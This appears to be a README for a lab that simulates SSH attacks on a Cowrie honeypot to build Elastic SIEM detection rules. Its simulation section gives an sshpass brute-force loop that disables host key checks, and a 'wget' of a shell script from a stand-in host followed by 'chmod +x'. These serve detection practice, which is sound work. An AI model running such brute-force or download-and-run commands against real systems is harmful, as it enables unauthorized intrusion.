# Elastic SIEM Detection Lab: SSH Attack Lifecycle

## Overview

This project simulates real-world SSH attacks using a Cowrie honeypot and builds detection rules in Elastic SIEM to identify attacker behavior across the full intrusion lifecycle.

The lab demonstrates detection and investigation of:

* Brute force authentication attempts
* Successful account compromise
* Post-authentication command execution
* Interactive attacker behavior

---

## Architecture

```mermaid
flowchart LR
    A[Attacker] --> B[Cowrie Honeypot VPS]
    B --> C[Elastic Agent]
    C --> D[Elasticsearch]

    D --> E[Detection Rules]
    E --> F[Alerts - Elastic Security]

    F --> G[Analyst Investigation - Kibana Discover]

    subgraph Detection Types
        E1[Threshold Rules - Brute Force]
        E2[Correlation Rules - Brute Force to Success]
        E3[Custom Query - Suspicious Commands]
        E4[Behavioral Detection - Interactive Sessions]
    end

    E --> E1
    E --> E2
    E --> E3
    E --> E4

    G --> H[Pivot on source IP]
    H --> I[Reconstruct Attack Timeline]
```

---

## Attack Simulation

A controlled attack sequence was used to generate consistent and repeatable log data.

### Failed Login Attempts

```bash
for i in {1..10}; do
  sshpass -p wrongpass ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p 22 root@<IP> "exit"
done
```

### Successful Login

```bash
ssh root@<IP> -p 22
```

### Post-Access Activity

```bash
ls
pwd
whoami
cd /tmp
wget http://example.com/test.sh
chmod +x test.sh
```

---

## Detection Rules

- [Brute Force Detection](detections/brute-force.md)
- [Brute Force to Success (Correlation)](detections/brute-force-success-correlation.md)
- [Suspicious Command Detection](detections/suspicious-commands.md)
- [Interactive Session Detection](detections/interactive-session.md)
---

## Attack Lifecycle Detection

```mermaid
flowchart LR
    A[Brute Force Attempts] --> B[Successful Login]
    B --> C[System Exploration]
    C --> D[Command Execution]
```

---

## Key Insights

* Detection accuracy depends on correct data source alignment
* Field normalization improves detection reliability
* Correlation rules increase confidence by linking related events
* Controlled testing enables consistent validation

---

## Challenges and Solutions

| Challenge                       | Solution                                     |
| ------------------------------- | -------------------------------------------- |
| Attacks targeting wrong service | Corrected to target honeypot port            |
| Cowrie accepting all passwords  | Implemented user database for authentication |
| SSH tool compatibility issues   | Switched from Hydra to sshpass               |
| Excessive alert noise           | Tuned thresholds and correlation windows     |

---

## Lessons Learned

* Detection engineering requires iterative tuning
* Data quality and normalization are critical
* Correlating events provides stronger detection than single alerts
* Investigation workflows are as important as detection logic

---

## Future Improvements

* Expand command detection coverage
* Improve honeypot realism (filesystem, artifacts)
* Add enrichment (GeoIP, ASN)
* Introduce additional behavioral detections

---

## Summary

This project demonstrates the ability to:

* Simulate attacker behavior
* Build and tune SIEM detections
* Correlate events into meaningful alerts
* Investigate and validate security incidents

It represents a practical, hands-on approach to detection engineering and SOC operations.
